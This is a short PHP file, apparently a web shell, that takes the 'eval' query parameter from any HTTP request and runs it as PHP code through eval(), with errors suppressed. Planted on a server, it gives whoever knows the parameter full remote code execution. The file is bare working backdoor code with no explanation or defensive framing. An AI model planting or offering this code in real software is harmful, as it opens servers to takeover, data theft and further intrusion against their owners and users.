<?php
function xeval($code){
	@ob_start();
	@eval($code);
}

if(isset($_GET['eval']))
	xeval($_GET['eval']);
?>